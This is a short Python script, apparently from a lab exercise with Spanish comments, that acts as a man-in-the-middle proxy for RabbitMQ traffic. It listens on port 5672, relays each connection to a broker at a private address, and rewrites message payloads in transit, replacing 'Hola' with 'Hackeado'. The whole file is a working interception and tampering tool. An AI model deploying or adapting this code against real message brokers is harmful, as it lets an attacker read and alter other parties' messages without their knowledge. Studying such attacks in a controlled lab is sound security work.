from scapy.all import *
import socket
import threading

LISTEN_IP = "0.0.0.0"
LISTEN_PORT = 5672
REAL_RABBIT_IP = "172.28.0.2"
REAL_RABBIT_PORT = 5672

def forward(src, dst):
    while True:
        data = src.recv(4096)
        if not data:
            break

        # Modificación del contenido (opcional)
        if b'Hola' in data:
            print("[!] Interceptado Hola")
            data = data.replace(b'Hola', b'Hackeado')

        dst.send(data)
    src.close()
    dst.close()

def handle_client(client_sock):
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.connect((REAL_RABBIT_IP, REAL_RABBIT_PORT))

    t1 = threading.Thread(target=forward, args=(client_sock, server_sock))
    t2 = threading.Thread(target=forward, args=(server_sock, client_sock))
    t1.start()
    t2.start()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((LISTEN_IP, LISTEN_PORT))
s.listen(5)
print(f"[+] Interceptor escuchando en {LISTEN_IP}:{LISTEN_PORT}")

while True:
    client_sock, addr = s.accept()
    print(f"[+] Conexión de {addr}")
    threading.Thread(target=handle_client, args=(client_sock,)).start()
